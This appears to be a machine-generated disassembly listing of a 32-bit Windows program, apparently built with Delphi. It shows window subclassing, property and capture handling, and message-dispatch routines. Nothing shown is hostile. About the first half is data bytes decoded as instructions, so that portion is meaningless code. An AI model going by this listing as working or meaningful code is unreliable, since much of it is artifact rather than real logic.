je r-xdata
outsb
add [ esi - 0x18 ] dl
inc ebx
add [ ecx + eax ] bl
outsb
je r-xdata
add [ eax - 0x77ffbdf2 ] bl
xor al 0x40
add al bl
jo r-xdata
dec ebp
outsd
jne r-xdata
adc [ eax ] cl
push esp
push ebx
push 0x53746669
je r-xdata
dec ebp
outsd
jne r-xdata
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x40 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
push eax
outsd
jae r-xdata
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x40 ] bl
add ah ah
jns r-xdata
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
lea eax [ eax ]
in al dx
in eax 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1a ] bh
inc ebx
add [ eax + ebp * 8 + 0x43 ] ah
add [ eax ] al
jbe r-xdata
inc esp
add [ eax + eax * 2 - 0x559bffbc ] ah
inc ecx
add [ esp + ecx * 2 + 0x44 ] dh
add [ eax - 0xbffbbe0 ] cl
pop ds
inc esp
add [ eax - 0x4fffbbd7 ] ah
push cs
inc edx
add [ ebx + ecx + 0xb7c0042 ] al
inc edx
add [ eax - 0x47ffbdf2 ] bh
sbb al 0x44
add [ ebx + edi ] bh
inc esp
add [ eax ] bh
cmp eax [ eax + eax + 0x8 ]
cmp al 0x44
add ah bh
push ds
inc esp
add [ eax + 0x26 ] al
inc esp
add [ ebp + 0x2ecc0044 ] ah
inc esp
add [ esi + ebx + 0x44 ] al
add [ eax + 0x1e ] cl
inc esp
add [ esi + ecx * 2 + 0x44 ] al
add [ eax + 0x4e ] dh
inc esp
add [ eax - 0x3fffbbd7 ] cl
pop ds
inc esp
add [ ebx + ebp ] dl
inc esp
add [ edx + ebp + 0x2da00044 ] cl
inc esp
add [ esp + ebp + 0x44 ] cl
add [ eax ] bh
inc esp
add ah dh
dec esi
inc esp
add [ eax + esi + 0x31000044 ] cl
inc esp
add [ ecx + 0x44 ] dh
add al ah
xor [ eax + eax + 0xe ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah cl
adc [ eax ] al
add [ eax ] 0x0
add ah cl
adc [ eax ] al
push esp
add [ eax ] eax
add [ ebx ] cl
add [ edx ] eax
mov eax [ 0x7020400 ]
add al [ ebx ]
add al [ esi ]
add cl [ ecx ]
add al [ eax ]
add al [ edx ]
add al [ 0xa020802 ]
add bl [ edi ]
add [ edi ] al
or esi [ eax - 0x4ff14ff4 ]
or eax 0x35b008b0
mov al 0x9
mov al 0x23
mov al 0x30
mov al 0xa
mov al 0x13
mov al 0x14
mov al 0x1c
mov al 0x3a
mov al 0x3c
mov al 0x3d
mov al 0x43
mov al 0x7b
add bh ch
add [ eax - 0x53ffbbe3 ] dl
dec esp
push eax
outsd
jae r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x40 ] bl
add ah ah
jns r-xdata
add [ edi ] eax
dec eax
popad
outsb
insb
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
adc [ eax ] cl
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx + 0x8 ] si
outsb
insb
pop es
inc edx
add [ edi ] eax
dec eax
popad
push esp
push eax
outsd
sub_43e37f
jb r-xdata
dec esi
ja r-xdata
or [ esi + 0x65 ] ecx
ja r-xdata
inc ebp
jbe r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
je r-xdata
inc eax
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebx + 0x43e44cc0 ] cl
outsb
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x43e4d4c0 ] cl
push edi
push 0x456c6565
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push edx
jae r-xdata
push es
je r-xdata
push edi
push 0x556c6565
add [ eax ] cl
push ss
push esp
dec ebp
outsd
jne r-xdata
add [ eax + edx + 0x40 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
aam 0xe4
inc ebx
outsb
add [ eax ] ecx
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
pop es
dec ecx
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
add [ eax ] ecx
je r-xdata
dec ecx
outsb
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
je r-xdata
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x560043e6 ] dl
call 0x19fe609
js r-xdata
insb
outsd
ja r-xdata
add eax 0x65530608
outsb
jb r-xdata
je r-xdata
outsb
push esp
dec edi
bound ebp [ edx + 0x65 ]
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
jo r-xdata
je r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] cl
push 0x6e490774
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x40 ] bl
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
mov esp 0x80043e3
pop ss
push esp
inc ebx
outsd
outsb
jae r-xdata
add [ eax ] al
xor al 0x8d
inc ecx
push eax
outsd
jo r-xdata
imul ebp [ esi + 0x74 ] 0x61480701
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
dec eax
in eax 0x43
add [ eax ] cl
adc dl [ ebx + eax * 2 + 0x6f ]
outsb
jne r-xdata
inc ebp
add [ 0x66696853 ] al
je r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] ecx
jbe r-xdata
add [ edx ] cl
push edi
push 0x446c6565
insb
je r-xdata
jb r-xdata
add [ eax - 0x77ffbdf2 ] bl
xor al 0x40
add al bl
jo r-xdata
pop es
inc edx
add [ eax - 0x33ffbfcc ] dl
aas
inc esp
add ah cl
xor [ eax ] eax
call 0xffffffff9044261a
sbb eax 0x4cac0044
add [ ecx * 4 + 0xe980041 ] dh
inc edx
add [ eax - 0x27ffbfcc ] cl
inc ebp
js r-xdata
outsb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
push 0x65
imul esp [ gs : edi + 0x68 ] 0x6e490774
push ebx
outsb
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
je r-xdata
push 0x6e490774
je r-xdata
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] 0x6e657645
lea eax [ eax ]
in al dx
in eax 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1a ] bh
inc ebx
add [ eax + ebp * 8 + 0x43 ] ah
add [ eax ] al
jbe r-xdata
add [ esi - 0x18 ] dl
inc ebx
add [ ecx + eax ] bl
outsb
je r-xdata
add al 0x8
push es
jb r-xdata
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ edi ] eax
dec eax
popad
or [ ebp + 0x6f ] cl
jne r-xdata
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x6f ] dl
jne r-xdata
pop esp
adc [ eax ] eax
push esp
adc [ eax ] al
push esp
adc [ eax ] al
push esp
adc [ eax ] al
push esp
adc [ eax ] al
mov eax eax
dec esp
in al 0x43
adc [ eax ] cl
push esp
push ebx
push 0x53746669
je r-xdata
dec ebp
outsd
jne r-xdata
je r-xdata
adc [ eax ] cl
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx + 0x8 ] si
dec ebp
outsd
jne r-xdata
imul esp [ esi + 0x74 ] 0x6853540b
imul esp [ esi + 0x74 ] 0x74617453
adc [ gs : eax ] cl
push eax
outsd
jae r-xdata
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x40 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
push eax
outsd
jae r-xdata
inc esp
add [ eax + eax * 2 - 0x559bffbc ] ah
inc ecx
add [ esp + ecx * 2 + 0x44 ] dh
add [ eax - 0xbffbbe0 ] cl
pop ds
inc esp
add [ eax - 0x4fffbbd7 ] ah
push cs
inc edx
add [ ebx + ecx + 0xb7c0042 ] al
inc edx
add [ eax - 0x47ffbdf2 ] bh
sbb al 0x44
add [ ebx + edi ] bh
inc esp
add [ eax ] bh
cmp eax [ eax + eax + 0x8 ]
cmp al 0x44
add ah bh
push ds
inc esp
add [ eax + 0x26 ] al
inc esp
add [ ebp + 0x2ecc0044 ] ah
inc esp
add [ esi + ebx + 0x44 ] al
add [ eax + 0x1e ] cl
inc esp
add [ esi + ecx * 2 + 0x44 ] al
add [ eax + 0x4e ] dh
inc esp
add [ eax - 0x3fffbbd7 ] cl
pop ds
inc esp
add [ ebx + ebp ] dl
inc esp
add [ edx + ebp + 0x2da00044 ] cl
inc esp
add [ esp + ebp + 0x44 ] cl
add [ eax ] bh
inc esp
add ah dh
dec esi
inc esp
add [ eax + esi + 0x31000044 ] cl
inc esp
add [ ecx + 0x44 ] dh
add al ah
xor [ eax + eax + 0xe ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah cl
adc [ eax ] al
add [ eax ] 0x0
add ah cl
adc [ eax ] al
push esp
add [ eax ] eax
add [ ebx ] cl
add [ edx ] eax
mov eax [ 0x7020400 ]
add al [ ebx ]
add al [ esi ]
add cl [ ecx ]
add al [ eax ]
add al [ edx ]
add al [ 0xa020802 ]
add bl [ edi ]
add [ edi ] al
or esi [ eax - 0x4ff14ff4 ]
or eax 0x35b008b0
mov al 0x9
mov al 0x23
mov al 0x30
mov al 0xa
mov al 0x13
mov al 0x14
mov al 0x1c
mov al 0x3a
mov al 0x3c
mov al 0x3d
mov al 0x43
mov al 0x7b
add bh ch
add [ eax - 0x53ffbbe3 ] dl
dec esp
push eax
outsd
jae r-xdata
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x40 ] bl
add ah ah
jns r-xdata
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x40 ] bl
add ah ah
jns r-xdata
add [ edi ] eax
dec eax
popad
outsb
insb
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
outsb
insb
pop es
inc edx
add [ edi ] eax
dec eax
popad
push esp
push eax
outsd
sub_43eb4c
push eax
jmp r-xdata
jae r-xdata
or cl [ eax ]
push esp
dec ecx
insd
dec esi
popad
insd
mov eax eax
xor al 0xeb
inc ebx
add [ ecx ] al
or al 0x54
inc edx
outsd
jb r-xdata
cwde
insb
inc ebp
add [ gs : bx + si ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ ebx + ebp * 8 + 0x62060043 ] dl
dec esp
jb r-xdata
inc ebx
add [ esi ] al
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
pop es
bound esp [ ebp + 0x54 ]
outsd
jo r-xdata
jmp r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x5
add bh bh
add [ eax ] al
insb
inc ebp
jae r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x105
outsd
insd
or [ ebx + 0x6f ] al
outsb
je r-xdata
inc edx
outsd
je r-xdata
or [ edx + 0x65 ] ah
bound esp [ ebp + 0x52 ]
imul esp [ edi + 0x68 ] 0x65620874
jmp r-xdata
xchg esp eax
add bh bh
add [ eax ] al
outsd
insb
jae r-xdata
insb
jae r-xdata
je r-xdata
jmp r-xdata
sar [ eax ] 0xec
push ebx
outsd
je r-xdata
sub dh al
inc ebx
add [ edx + eax ] al
add [ eax ] al
mov al [ 0xffffffff980043e5 ]
push cs
inc edx
add [ eax - 0x27ffbfcc ] cl
pop es
inc edx
add [ eax + 0x18004034 ] dl
outsd
inc esp
add ah cl
xor [ eax ] eax
call 0xfffffffff0442cfe
push ecx
inc esp
add al dh
sahf
inc esp
add al ah
inc sp
add [ edx + ebp * 4 + 0x41 ] ah
add [ esp + ecx * 2 + 0x44 ] dh
add [ eax - 0x6bffbbe0 ] cl
push ebx
inc esp
add [ eax - 0x4fffbbd7 ] ah
push cs
inc edx
add [ ebx + ecx + 0xb7c0042 ] al
inc edx
add [ eax - 0x33ffbdf2 ] bh
push eax
inc esp
add [ edx + ebx * 4 ] al
inc esp
add [ eax ] ah
lahf
inc esp
add [ esi + ebx * 4 + 0x44 ] ch
add ah bh
push ds
inc esp
add [ eax - 0x5fffbb6c ] al
xchg esp eax
inc esp
add [ eax + 0x44004491 ] al
push ds
inc esp
add [ eax + 0x1e ] cl
inc esp
add [ esi + ecx * 2 + 0x44 ] al
add [ eax + 0x4e ] dh
inc esp
add [ eax - 0x3fffbbd7 ] cl
pop ds
inc esp
add [ ebx + ebp ] dl
inc esp
add [ edx + ebp + 0x2da00044 ] cl
inc esp
add [ esp + ebp + 0x44 ] cl
add [ ebp + ebp * 2 + 0x4ef40044 ] dh
inc esp
add [ edx + edx * 4 ] cl
inc esp
add al cl
xchg edx eax
inc esp
add [ ebp + ecx * 4 - 0x6d53ffbc ] cl
inc esp
add [ esp + edx * 2 ] cl
inc esp
add [ eax + 0x4000445a ] ah
push 0x622c0044
inc esp
add [ eax ] ch
inc esp
add [ eax + 0x63 ] bl
inc esp
add al bl
push 0x68dc0044
inc esp
add [ edi + 0x673c0044 ] dl
inc esp
add ah ch
xchg ebx eax
inc esp
add [ ecx + esi * 2 - 0x5a3fffbc ] al
inc esp
add [ eax ] dh
nop
inc esp
add [ eax - 0x6d ] bl
inc esp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax - 0x14 ] dl
inc ebx
add [ ecx + eax ] bh
add [ eax ] ah
jmp r-xdata
insb
push edi
or [ ebx + 0x6f ] al
bound ebp [ ebx + 0x46 ]
insb
popad
je r-xdata
lsl edx [ ecx ]
add ebx [ edx ]
add [ 0x7001e00 ] bl
add [ eax ] cl
add [ 0x7b010e01 ] cl
add [ edi ] dh
mov al 0x2e
mov al 0x5
mov al 0x6
mov al 0x7
mov al 0xb
mov al 0xc
mov al 0xd
mov al 0xe
mov al 0x3b
mov al 0xf
mov al 0x10
mov al 0x11
mov al 0x19
mov al 0x22
mov al 0x1a
mov al 0x1b
mov al 0x1c
mov al 0x24
mov al 0x35
mov al 0x25
mov al 0x26
mov al 0x27
mov al 0x2f
mov al 0x0
mov ebp 0xbd02bd01
add al 0xbd
push es
mov ebp 0xb033b02c
xor al 0xb0
cmp [ eax - 0x4fc54fc7 ] dh
cmp al 0xb0
sbb [ ebx ] al
out dx eax
in eax dx
inc ebx
add [ edx ] ch
outsd
inc ebx
add [ ecx ] al
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
mov eax eax
cmp ah ch
outsb
je r-xdata
inc ebx
outsd
sub_43f45c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
hlt
sub_43f9ac
push ebp
mov ebp esp
push ecx
push ebx
lea ebx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x180 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x18c ]
push eax
push 0xfffffffc
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push 0xfffffff0
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
call [ eax + 0x18c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0x10
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
sub_43fa64
push ebx
push ecx
mov ebx eax
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
xor eax eax
pop edx
pop ebx
retn
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push ebx
call SendMessageA
pop edx
pop ebx
retn
sub_43fa98
push ebx
push esi
push ecx
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop edx
pop esi
pop ebx
retn
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_4044c8
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax ebx
call sub_43fa64
mov esi eax
movzx eax [ rw-data ]
push eax
push ebx
call GetPropA
mov esi eax
jmp r-xdata
sub_43faf4
push ebx
push esi
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
push ecx
push edx
push eax
mov eax [ rw-data ]
push esi
call SendMessageA
pop esi
pop ebx
retn
sub_43fcd8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c6e8
mov ebx eax
test ebx ebx
jne r-xdata
push edi
mov ecx ebx
dec ecx
mov edx 0x1
mov eax esi
call sub_404528
mov eax edi
mov edx esi
call sub_40405c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43fd1c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c6e8
mov ebx eax
test ebx ebx
jne r-xdata
push edi
lea edx [ ebx + 0x1 ]
mov ecx 0x7fffffff
mov eax esi
call sub_404528
mov eax edi
mov edx esi
call sub_40405c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43fd88
push ebx
mov ebx eax
call ReleaseCapture
xor eax eax
mov [ rw-data ] eax
test ebx ebx
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
jne r-xdata
mov eax ebx
call sub_4493d8
push eax
call SetCapture
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov [ rw-data ] ebx
mov ebx [ ebx + 0x30 ]
sub_43fe34
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
jmp r-xdata
mov edx [ ebx ]
cmp edx [ esi + 0x8 ]
jl r-xdata
mov edx [ ebx ]
mov eax esi
call sub_41a468
cmp edi [ eax + 0x4 ]
sete al
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
inc [ ebx ]
sub_43fe68
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4493d8
mov ebx eax
test eax eax
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov ebx eax
push eax
call GetParent
test eax eax
jne r-xdata
sub_43fe90
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax 0x8
call sub_40279c
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ ebx ] eax
push ebp
call sub_43fe68
pop ecx
mov edi eax
mov [ ebx + 0x4 ] edi
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax esi
call sub_43fe34
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_41a30c
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_41a4e4
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43feec
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
call sub_41a340
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_41a468
mov edx 0x8
call sub_4027bc
inc esi
dec ebx
jne r-xdata
sub_43ff20
push ebx
push esi
push edi
push ecx
mov ebx eax
xor edi edi
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax edi
pop edx
pop edi
pop esi
pop ebx
retn
dec eax
jne r-xdata
call GetDesktopWindow
push eax
call GetTopWindow
mov esi eax
jmp r-xdata
xor edx edx
mov eax ebx
call sub_41a468
mov edi [ eax ]
jmp r-xdata
test edi edi
jne r-xdata
test esi esi
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
call sub_43fe34
test al al
je r-xdata
push 0x2
push esi
call __imp_GetWindow
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ esp ]
mov eax [ eax + edx * 4 ]
mov edi [ eax ]
jmp r-xdata
sub_43ff84
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov ecx [ edx + 0xc ]
mov [ eax + 0xc ] ecx
mov ecx [ edx + 0x10 ]
mov [ eax + 0x10 ] ecx
mov ecx [ edx + 0x14 ]
mov [ eax + 0x14 ] ecx
mov ecx [ edx + 0x18 ]
mov [ eax + 0x18 ] ecx
mov ecx [ edx + 0x20 ]
mov [ eax + 0x20 ] ecx
mov ecx [ edx + 0x24 ]
mov [ eax + 0x24 ] ecx
mov ecx [ edx + 0x28 ]
mov [ eax + 0x28 ] ecx
mov ecx [ edx + 0x2c ]
mov [ eax + 0x2c ] ecx
retn
sub_43ffe4
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_403184
mov edx esp
mov eax esi
call sub_40426c
add esp 0x100
pop esi
pop ebx
retn
sub_440020
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4400ea
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x215
jg r-xdata
sub eax 0xbd00
je r-xdata
je r-xdata
mov eax [ ebx + 0x4 ]
sub eax 0x11
je r-xdata
dec eax
je r-xdata
xor eax eax
call sub_441140
jmp r-xdata
sub eax 0x200
je r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_440ac8
jmp r-xdata
sub eax 0xa
je r-xdata
cmp [ ebx + 0x4 ] 0x11
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406dd8
lea eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
push eax
call ClientToScreen
lea eax [ ebp - 0xc ]
call sub_440ac8
jmp r-xdata
sub eax 0x2
je r-xdata
mov [ ebx + 0xc ] 0x1
xor eax eax
call sub_441140
jmp r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_440ac8
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov al 0x1
call sub_441140
jmp r-xdata
sub eax 0x3
je r-xdata
jmp r-xdata
sub_4400ef
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_462838
call sub_403a3c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
call sub_441140
sub_440148
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_440172
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4401d8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43ff84
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x38 ]
mov [ ebx + 0x38 ] eax
sub_440204
push ebp
mov ebp esp
push ecx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffdd
call sub_403430
pop edi
pop esi
pop ecx
pop ebp
retn 0x4
sub_440230
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x38 ]
mov si 0xffdf
call sub_403430
xor edx edx
sub_440288
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_44afdc
sub_4402a8
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_44afc4
sub_4402cc
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4401b4
mov dl 0x1
mov eax [ r-xdata ]
call sub_4240c8
mov esi eax
mov [ ebx + 0x40 ] esi
mov edx 0xffffff
xor eax eax
call sub_42ae20
mov edx eax
mov eax esi
call sub_424244
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_440330
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
call sub_403234
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403224
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_440360
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4401d8
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov dl [ eax + 0x54 ]
mov [ ebx + 0x54 ] dl
mov edx [ eax + 0x58 ]
mov [ ebx + 0x58 ] edx
mov dl [ eax + 0x6c ]
mov [ ebx + 0x6c ] dl
push esi
lea esi [ eax + 0x44 ]
lea edi [ ebx + 0x44 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
lea esi [ eax + 0x5c ]
lea edi [ ebx + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx [ eax + 0x40 ]
mov eax [ ebx + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_4403bc
push ebp
mov ebp esp
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffe5
call sub_403430
pop edi
pop esi
pop ebp
retn 0x4
sub_4403e0
push ebx
push esi
mov ebx edx
mov ecx eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov esi eax
mov eax ebx
cdq
xor eax edx
sub eax edx
cmp esi eax
jge r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax ecx
pop esi
pop ebx
retn
sub_440404
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax [ ebx + 0xc ]
mov edx [ esp ]
cmp eax edx
jl r-xdata
sub edx eax
mov ecx [ esp + 0x8 ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_4403e0
mov esi eax
jmp r-xdata
cmp eax [ esp + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ esp + 0x4 ]
cmp eax edx
jl r-xdata
xor esi esi
sub edx eax
mov ecx [ esp + 0xc ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_4403e0
jmp r-xdata
